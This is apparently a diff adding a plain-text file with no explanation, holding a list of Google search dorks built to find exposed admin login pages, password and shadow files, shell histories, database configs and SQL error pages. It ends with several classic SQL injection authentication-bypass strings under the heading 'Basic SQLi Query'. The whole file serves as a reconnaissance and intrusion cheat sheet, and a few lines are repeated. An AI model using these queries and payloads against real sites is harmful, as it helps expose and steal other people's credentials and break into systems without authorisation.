@@ -1,0 +1,47 @@
+inurl:index of admin?site:.domain
+intitle: admin login site:.domain
+inurl:admin/home.php site:.domain
+example: inurl:index of admin?site:.in
+filetype:xls username password email
+filetype:htpasswd htpasswd
+intitle:”the page cannot be found” inetmgr
+“supplied argument is not a valid MySQL result resource”
+“access denied for user” “using password”
+“A syntax error has occurred” filetype:ihtml
+intitle:”Index of” “.htpasswd” “htgroup” -intitle:”dist” -apache -htpasswd.c
+intitle:index.of administrators.pwd
+intitle:Index.of etc shadow
+intitle:index.of secring.pgp
+inurl:config.php dbuname dbpass
+intitle:”Index of” master.passwd
+intitle:”Index of” .mysql_history
+intitle:index.of passlist
+inurl:passlist.txt
+intitle:”Index of” passwd passwd.bak
+intitle:”Index of..etc” passwd
+intitle:”Index of” spwd.db passwd -pam.conf
+intitle:”Index of” .bash_history
+intitle:”Index of” .sh_history
+“Welcome to phpMyAdmin” AND ” Create new database”
+intitle:”Index of c:\Windows”
+intitle:index.of.winnt
+allinurl:install/install.php
+aboutprinter.shtml
+allintitle:Netscape FastTrack Server Home Page
+intitle:”Apache HTTP Server” intitle:”documentation”
+intitle:”Welcome to IIS 4.0″
+i_index.shtml “Ready”
+intitle:”Test Page for Apache” “It Worked!”
+inurl:tech-support inurl:show Cisco
+“powered by openbsd” +”powered by apache”
+
+
+inurl:index of admin?site:.domain
+intitle: admin login site:.domain
+inurl:admin/home.php site:.domain
+example: inurl:index of admin?site:.in
+
+Basic SQLi Query:
+1 ‘or’ 1 ‘=’ 1
+0 ‘or’ 0 ‘=’ 0
+‘OR ‘1’=’1′
